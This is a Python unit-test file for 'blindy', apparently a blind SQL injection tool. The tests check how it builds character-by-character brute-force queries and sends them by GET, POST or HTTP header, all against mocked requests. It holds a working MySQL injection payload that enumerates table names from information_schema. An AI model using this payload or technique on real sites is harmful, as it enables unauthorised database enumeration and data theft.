import unittest
import blindy
import re
from unittest.mock import patch, MagicMock, Mock

PARAMETERS = ['submit=true', 'admin=1', 'phrase']

SIMPLE_PHRASE_WITHOUT_PLACEHOLDER = "some phrase"

PHRASE_WITH_PLACEHOLDER = "some phrase with {} placeholder"

SIMPLE_PAYLOAD = {'submit': 'true', 'admin': '1', 'phrase': 'some+phrase'}

RESPONSE = "<html>some response</html>"

HTTP_URL = "http://url"

QUERY = "' or (select table_name from information_schema.TABLES where table_schema not in (NOTIN) limit 1) regexp '^{}'#"

PATTERN = re.compile('.*response.*')


class TestStringMethods(unittest.TestCase):

    def testCreateBruteQuery(self):
        # when
        res = blindy.createBruteQuery('word', QUERY)

        # then
        self.assertEqual(res, "' or (select table_name from information_schema.TABLES where table_schema not in (NOTIN) limit 1) regexp '^word'#")

    def testCreateWord(self):
        # when
        res = blindy.createWord('strin', 'g')
        # then
        self.assertEqual(res, 'string')

    def testSubstitutePlaceholders(self):
        # when
        res = blindy.substitutePlaceholders(QUERY)

        # then
        self.assertEqual(res, "' or (select table_name from information_schema.TABLES where table_schema not in ('information_schema','mysql','performance_schema','sys') limit 1) regexp '^{}'#")

    def testPreparePayload(self):
        # when
        res = blindy.preparePayload(PARAMETERS, SIMPLE_PHRASE_WITHOUT_PLACEHOLDER, True)

        # then
        self.assertEqual(res, SIMPLE_PAYLOAD)

    def testBruteforceSimplePhraseWithoutPlaceholders(self):
        # given
        blindy.inGETrequest = Mock()
        blindy.inGETrequest.return_value = RESPONSE

        #when
        res = blindy.bruteforce(['submit=true', 'admin=1', 'phrase'],"word", SIMPLE_PHRASE_WITHOUT_PLACEHOLDER, HTTP_URL, blindy.inGETrequest, PATTERN, True)

        # then
        self.assertEqual(res, RESPONSE)
        blindy.inGETrequest.assert_called_once_with(SIMPLE_PAYLOAD, HTTP_URL)

    def testRunInjectionPOST(self):
        # given
        blindy.bruteforce = Mock()
        blindy.bruteforce.return_value = RESPONSE
        blindy.inPOSTrequest = Mock()

        # when
        blindy.runInjection("POST", PARAMETERS, [QUERY, QUERY], HTTP_URL, PATTERN)

        # then
        blindy.bruteforce.assert_called_with(PARAMETERS, '', QUERY, HTTP_URL, blindy.inPOSTrequest, PATTERN, True)


    def testRunInjectionGET(self):
        # given
        blindy.bruteforce = Mock()
        blindy.bruteforce.return_value = RESPONSE
        blindy.inGETrequest = Mock()

        # when
        blindy.runInjection("GET", PARAMETERS, [QUERY, QUERY], HTTP_URL, PATTERN)

        # then
        blindy.bruteforce.assert_called_with(PARAMETERS, '', QUERY, HTTP_URL, blindy.inGETrequest, PATTERN, True)

    def testRunInjectionHEADER(self):
        # given
        blindy.bruteforce = Mock()
        blindy.bruteforce.return_value = RESPONSE
        blindy.inHTTPheader = Mock()

        # when
        blindy.runInjection("HEADER", PARAMETERS, [QUERY, QUERY], HTTP_URL, PATTERN)

        # then
        blindy.bruteforce.assert_called_with(PARAMETERS, '', QUERY, HTTP_URL, blindy.inHTTPheader, PATTERN, True)



if __name__ == '__main__':
    unittest.main()